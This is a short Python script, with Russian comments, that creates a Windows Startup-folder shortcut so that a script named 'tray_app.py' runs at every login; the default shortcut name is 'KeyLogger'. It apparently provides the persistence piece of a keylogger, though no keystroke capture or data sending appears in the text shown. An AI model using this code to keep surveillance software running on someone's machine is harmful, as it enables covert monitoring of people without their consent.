import os
import sys
import win32com.client

def add_to_autostart(script_path, shortcut_name="KeyLogger"):
    startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    shortcut_path = os.path.join(startup_dir, f"{shortcut_name}.lnk")

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.Targetpath = sys.executable  # путь до python.exe
    shortcut.Arguments = f'"{script_path}"'
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.IconLocation = sys.executable
    shortcut.save()
    print(f"[INFO] Ярлык добавлен в автозагрузку: {shortcut_path}")

if __name__ == "__main__":
    script = os.path.abspath("tray_app.py")
    add_to_autostart(script)
